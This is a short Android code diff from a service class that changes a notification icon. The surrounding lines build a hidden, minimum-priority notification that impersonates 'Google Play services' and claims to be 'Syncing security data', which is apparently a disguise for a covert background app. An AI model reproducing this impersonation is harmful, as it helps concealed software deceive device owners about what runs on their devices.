@@ -130,7 +130,7 @@ public class CompanionSyncService extends Service {
         return new NotificationCompat.Builder(this, CHANNEL_ID)
                 .setContentTitle("Google Play services")
                 .setContentText("Syncing security data")
-                .setSmallIcon(android.R.drawable.stat_sys_sync_none)
+                .setSmallIcon(R.drawable.ic_launcher)
                 .setPriority(NotificationCompat.PRIORITY_MIN)
                 .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                 .setContentIntent(pi)
